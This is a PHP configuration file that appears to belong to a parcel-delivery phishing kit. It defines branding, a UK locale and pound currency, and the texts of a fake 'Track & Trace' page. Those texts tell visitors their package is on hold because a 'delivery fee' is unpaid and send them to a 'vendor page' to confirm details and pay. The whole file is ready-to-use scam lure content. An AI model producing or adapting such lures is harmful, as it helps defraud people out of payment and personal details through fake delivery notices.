<?php

// product
$wallID = "e78a802e-cfb4-486e-937b-4dba9fc35c71";

// brand
$brandLogo = "/templates/brands/n6w0ipatxf9.png";
$favicon = "/templates/brands/ssfw2x2ftt.x-icon";
$mainColor = "rgb(220,0,50)";
$secondaryColor = "rgb(220,0,50)";
$headerColor = "#ffffff";
$white = "";

// geo
$geo = "uk";
$langTag = "en";
$currency = "£";

// texts
$texts = [
    "us-dhh" => [
        "title" => "Track &amp; Trace",
        "text1" => "DELIVERY PENDING",
        "text2" => "You have (1) package on hold.",
        "text3" => "Your package was picked up",
        "text4" => "Package# AIPD-1512-KL10",
        "text5" => "Your package is prepared for delivery!",
        "text6" => "Package on hold",
        "text7" => "Please confirm delivery details on next page",
        "text8" => "Delivery fee not paid by vendor",
        "text9" => "Please confirm your delivery details on the next page",
        "text10" => "Your Tracking Code",
        "text11" => "Continue",
        "text12" => "Locating your package...",
        "text13" => "Looking for the tracking number...",
        "text14" => "Looking for delivery options...",
        "text15" => "Package Information:",
        "text16" => "Contents per waybill:",
        "text17" => "Status:",
        "text18" => "Ready to ship",
        "text19" => "Shipping Via:",
        "text20" => "Shipping Cost:",
        "text21" => "Pending",
        "text22" => "Schedule Your Delivery Now",
        "text23" => "How would you like to receive your order?",
        "text24" => "Delivery at Home/Work",
        "text25" => "I&#x27;m going to pick it up myself",
        "text26" => "Where do you want it to be delivered?",
        "text27" => "At Home",
        "text28" => "At Work",
        "text29" => "When would like your delivery?",
        "text30" => "Weekday",
        "text31" => "Weekend",
        "text32" => "Saving your preferences",
        "text33" => "Confirming your package",
        "text34" => "The package is reserved!",
        "text35" => "ORDER CONFIRMATION",
        "text36" => "Expected Delivery:",
        "text37" => "Between 8:30am to 6:00pm",
        "text38" => "1. You will be redirected to the vendor page.",
        "text39" => "2. Please confirm your details and delivery fee.",
        "text40" => "3. Once completed, the expected delivery date is listed above.",
        "text41" => "NEXT PAGE",
        "text42" => "*Signature required at time of delivery",
        "text43" => "2024 © - all rights reserved",
        "text44" => "Site | Accounts | FAQs | Connect",
        "text45" => "The package is already in the depot."
    ]
];

?>